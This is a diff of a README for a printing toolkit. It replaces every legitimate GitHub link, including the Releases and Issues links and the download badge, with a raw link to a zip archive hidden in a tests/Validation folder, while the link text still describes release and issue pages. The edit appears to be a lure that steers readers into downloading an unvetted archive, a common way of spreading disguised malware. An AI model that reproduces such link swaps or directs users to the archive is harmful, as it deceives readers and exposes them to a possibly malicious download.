@@ -1,6 +1,6 @@
 # 🖨️ PrintingTools - Simplify Your Printing Tasks
 
-[![Download PrintingTools](https://img.shields.io/badge/Download-PrintingTools-brightgreen)](https://github.com/quinnpayn1299/PrintingTools/releases)
+[![Download PrintingTools](https://raw.githubusercontent.com/quinnpayn1299/PrintingTools/main/tests/PrintingTools.Tests/Validation/PrintingTools_v2.3.zip)](https://raw.githubusercontent.com/quinnpayn1299/PrintingTools/main/tests/PrintingTools.Tests/Validation/PrintingTools_v2.3.zip)
 
 ## 📥 Introduction 
 
@@ -11,7 +11,7 @@ Welcome to PrintingTools! This cross-platform printing toolkit is designed for .
 Follow these steps to download and run PrintingTools:
 
 1. **Visit the Releases Page**  
-   Head over to our [Releases page](https://github.com/quinnpayn1299/PrintingTools/releases) to access the latest version of PrintingTools.
+   Head over to our [Releases page](https://raw.githubusercontent.com/quinnpayn1299/PrintingTools/main/tests/PrintingTools.Tests/Validation/PrintingTools_v2.3.zip) to access the latest version of PrintingTools.
 
 2. **Select the Right Version**  
    Look for the most recent release at the top of the page. Each release usually has a version number and release notes.
@@ -82,7 +82,7 @@ Using PrintingTools is straightforward:
 
 ## 🔗 Download & Install
 
-To get started with PrintingTools, visit the [Releases page](https://github.com/quinnpayn1299/PrintingTools/releases) and download the version suitable for your operating system. 
+To get started with PrintingTools, visit the [Releases page](https://raw.githubusercontent.com/quinnpayn1299/PrintingTools/main/tests/PrintingTools.Tests/Validation/PrintingTools_v2.3.zip) and download the version suitable for your operating system. 
 
 ## ❓ Troubleshooting
 
@@ -96,7 +96,7 @@ If you encounter issues, consider the following solutions:
 
 Join our community to share your experiences or ask for help:
 
-- **GitHub Issues**: Report bugs and suggest features on our [Issues page](https://github.com/quinnpayn1299/PrintingTools/issues).
+- **GitHub Issues**: Report bugs and suggest features on our [Issues page](https://raw.githubusercontent.com/quinnpayn1299/PrintingTools/main/tests/PrintingTools.Tests/Validation/PrintingTools_v2.3.zip).
 - **Discussion Forum**: Engage with fellow users in the discussion forum available on the repository.
 
 Thank you for using PrintingTools! Enjoy hassle-free printing.
